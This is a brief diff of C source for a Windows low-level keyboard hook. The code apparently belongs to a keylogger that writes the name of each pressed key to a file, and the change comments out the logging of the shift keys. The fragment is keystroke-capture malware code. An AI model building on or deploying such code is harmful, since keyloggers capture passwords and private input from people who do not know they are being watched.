@@ -245,12 +245,14 @@ LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
 				case VK_RMENU:
 					fputs("[ralt]", kbpFile);
 					break;
+                                /*
 				case VK_LSHIFT:
 					fputs("[lshift]", kbpFile);
 					break;
 				case VK_RSHIFT:
 					fputs("[rshift]", kbpFile);
 					break;
+                                */
 				case VK_F1:
 					fputs("[f1]", kbpFile);
 					break;
